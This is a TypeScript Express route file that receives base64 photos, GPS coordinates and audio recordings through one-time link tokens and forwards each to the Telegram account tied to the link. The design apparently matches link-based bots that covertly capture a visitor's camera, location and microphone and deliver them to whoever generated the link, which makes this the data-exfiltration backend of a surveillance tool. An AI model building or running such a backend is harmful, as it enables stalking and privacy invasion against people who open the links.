import { Router, type IRouter } from "express";
import { Buffer } from "buffer";
import {
  sendPhotoToTelegram,
  sendLocationToTelegram,
  sendAudioToTelegram,
  ADMIN_ID,
} from "../lib/telegram-bot";
import { consumeLinkToken } from "../lib/db";

const router: IRouter = Router();

async function resolveTarget(token: string | undefined): Promise<number | null> {
  if (!token) return null;
  const record = await consumeLinkToken(token);
  return record ? Number(record.telegram_id) : null;
}

router.post("/upload", async (req, res) => {
  try {
    const token = req.query.token as string | undefined;
    const targetId = await resolveTarget(token);
    if (!targetId) {
      res.status(403).json({ status: "invalid or already used link" });
      return;
    }
    const raw: string = req.body;
    const base64Data = raw.split(",")[1];
    const imgBuffer = Buffer.from(base64Data, "base64");
    await sendPhotoToTelegram(targetId, imgBuffer);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Upload error:", err);
    res.status(500).json({ status: "error" });
  }
});

router.post("/upload-location", async (req, res) => {
  try {
    const token = req.query.token as string | undefined;
    const targetId = await resolveTarget(token);
    if (!targetId) {
      res.status(403).json({ status: "invalid or already used link" });
      return;
    }
    const { lat, lon } = req.body as { lat: number; lon: number };
    await sendLocationToTelegram(targetId, lat, lon);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Location error:", err);
    res.status(500).json({ status: "error" });
  }
});

router.post("/upload-audio", async (req, res) => {
  try {
    const token = req.query.token as string | undefined;
    const targetId = await resolveTarget(token);
    if (!targetId) {
      res.status(403).json({ status: "invalid or already used link" });
      return;
    }
    const raw: string = req.body;
    const [header, data] = raw.split(",");
    const mimeMatch = header.match(/data:([^;]+);base64/);
    const mimeType = mimeMatch ? mimeMatch[1] : "audio/webm";
    const audioBuffer = Buffer.from(data, "base64");
    await sendAudioToTelegram(targetId, audioBuffer, mimeType);
    res.json({ status: "sent" });
  } catch (err) {
    console.error("Audio error:", err);
    res.status(500).json({ status: "error" });
  }
});

export default router;
